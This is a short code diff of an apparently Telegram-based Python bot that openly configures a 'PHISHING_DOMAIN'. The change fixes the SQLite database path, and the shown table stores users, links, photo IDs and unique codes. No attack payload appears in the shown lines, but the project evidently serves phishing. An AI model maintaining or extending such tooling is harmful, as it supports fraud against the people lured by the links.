@@ -11,8 +11,11 @@ ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
 PHISHING_DOMAIN = os.environ.get('PHISHING_DOMAIN', 'https://your-server.onrender.com')
 CHANNEL_USERNAME = '@nrtecno2'
 
-# ========== DATABASE ==========
-conn = sqlite3.connect('shared/database.db', check_same_thread=False)
+# ========== DATABASE PATH FIX ==========
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DB_PATH = os.path.join(BASE_DIR, 'database.db')
+
+conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 c = conn.cursor()
 c.execute('''CREATE TABLE IF NOT EXISTS users
              (user_id INTEGER PRIMARY KEY, username TEXT, link TEXT, photo_id TEXT, unique_code TEXT)''')
